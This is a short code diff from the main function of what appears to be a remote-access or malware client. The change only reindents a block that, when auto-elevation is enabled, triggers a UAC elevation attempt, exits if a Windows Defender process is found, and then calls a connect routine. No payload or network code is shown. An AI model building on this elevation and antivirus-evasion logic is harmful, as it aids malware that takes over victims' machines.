@@ -17,13 +17,13 @@ int main() // entry point
     
     if(auto_elevate){
         if(!IsAdmin()){
-        UACTrigger();
-        Sleep(2000);
-        if(ProcessId("WindowsDefender.exe") != 0){
+            UACTrigger();
+            Sleep(2000);
+            if(ProcessId("WindowsDefender.exe") != 0){
+                exit(0);
+            }
             exit(0);
         }
-        exit(0);
-    }
     }
     
     MainConnect();
